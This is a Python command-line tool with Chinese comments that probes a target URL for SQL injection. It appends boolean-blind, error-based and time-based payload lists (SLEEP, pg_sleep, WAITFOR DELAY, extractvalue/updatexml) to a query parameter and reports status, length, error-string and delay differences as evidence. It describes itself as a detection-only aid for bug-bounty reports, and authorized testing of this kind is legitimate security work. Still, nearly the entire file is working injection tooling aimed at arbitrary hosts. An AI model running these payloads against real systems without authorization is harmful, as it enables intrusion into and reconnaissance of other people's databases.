#!/usr/bin/env python3
"""SQL 注入检测器 — 布尔盲注 + 报错注入 + 时间盲注

只做检测与证明，不 dump 数据。给补天报告取证用。

用法:
    python tools/sqliscan.py -u "https://target.com/api/items?id=1"
    python tools/sqliscan.py -u "https://target.com/api/items?id=1" --technique error
    python tools/sqliscan.py -u "https://target.com/api/items?id=1" -o result.txt
"""
import argparse
import time
import urllib.parse
from typing import Optional

import requests

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1-- -", "1' AND 1=2-- -"),
    ("1) AND 1=1-- -", "1) AND 1=2-- -"),
    ('" AND 1=1-- -', '" AND 1=2-- -'),
]

ERROR_PAYLOADS = [
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    "' AND 1=CAST((SELECT version()) AS int)-- -",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- -", 5),
    ("1' AND SLEEP(5)-- -", 5),
    ("1) AND SLEEP(5)-- -", 5),
    ("' AND pg_sleep(5)-- -", 5),
    ("'; WAITFOR DELAY '0:0:5'-- -", 5),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", 5),
]

ERROR_MARKS = [
    "XPATH syntax error", "SQL syntax", "mysql_fetch", "ORA-",
    "PostgreSQL", "SQLite", "ODBC", "Microsoft OLE DB",
    "Unclosed quotation", "You have an error in your SQL",
]


def send(session: requests.Session, url: str, timeout: int = 20):
    try:
        t0 = time.time()
        r = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
        return r, time.time() - t0
    except Exception as e:
        return None, str(e)


def inject(url: str, payload: str) -> str:
    """把 payload 拼到最后一个查询参数值末尾"""
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    if not qs:
        return url
    last_key = list(qs.keys())[-1]
    qs[last_key][0] = qs[last_key][0] + payload
    new_q = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))


def test_bool(session, url, verbose=True):
    findings = []
    for true_p, false_p in BOOL_PAYLOADS:
        rt, _ = send(session, inject(url, true_p))
        rf, _ = send(session, inject(url, false_p))
        if not rt or not rf:
            continue
        # 状态码不同 或 长度差异超过 15%
        diff_code = rt.status_code != rf.status_code
        lt, lf = len(rt.content), len(rf.content)
        diff_body = lf and abs(lt - lf) / max(lt, lf) > 0.15
        if diff_code or diff_body:
            msg = f"[布尔] {true_p}  |  {rt.status_code}/{lt}B  vs  {rf.status_code}/{lf}B"
            if verbose:
                print("  " + msg)
            findings.append(msg)
    return findings


def test_error(session, url, verbose=True):
    findings = []
    for p in ERROR_PAYLOADS:
        r, _ = send(session, inject(url, p))
        if not r:
            continue
        body = r.text[:4000]
        for mark in ERROR_MARKS:
            if mark.lower() in body.lower():
                msg = f"[报错注入] {p}  ->  命中特征: {mark}"
                if verbose:
                    print("  " + msg)
                findings.append(msg)
                break
    return findings


def test_time(session, url, verbose=True):
    findings = []
    for p, expected in TIME_PAYLOADS:
        r, elapsed = send(session, inject(url, p), timeout=expected + 10)
        if not r:
            continue
        if isinstance(elapsed, float) and elapsed >= expected * 0.8:
            msg = f"[时间盲注] {p}  ->  延迟 {elapsed:.2f}s"
            if verbose:
                print("  " + msg)
            findings.append(msg)
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="带参数的目标 URL")
    ap.add_argument("--technique", default="all", choices=["all", "bool", "error", "time"])
    ap.add_argument("--proxy", help="如 http://127.0.0.1:8080")
    ap.add_argument("-o", "--out", help="结果输出文件")
    args = ap.parse_args()

    requests.packages.urllib3.disable_warnings()

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*"})
    if args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}

    print(f"[*] 目标: {args.url}")
    print(f"[*] 技术: {args.technique}")

    all_findings = []
    if args.technique in ("all", "bool"):
        print("[1] 布尔盲注检测")
        all_findings += test_bool(s, args.url)
    if args.technique in ("all", "error"):
        print("[2] 报错注入检测")
        all_findings += test_error(s, args.url)
    if args.technique in ("all", "time"):
        print("[3] 时间盲注检测（较慢）")
        all_findings += test_time(s, args.url)

    print()
    if all_findings:
        print(f"[+] 确认存在注入，共 {len(all_findings)} 条证据")
        print("[!] 取证后请停止，不要 dump 数据")
        if args.out:
            with open(args.out, "w", encoding="utf-8") as f:
                f.write(f"target: {args.url}\n")
                f.write(f"time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("\n".join(all_findings) + "\n")
            print(f"[+] 已写入 {args.out}")
    else:
        print("[-] 未发现注入特征")


if __name__ == "__main__":
    main()
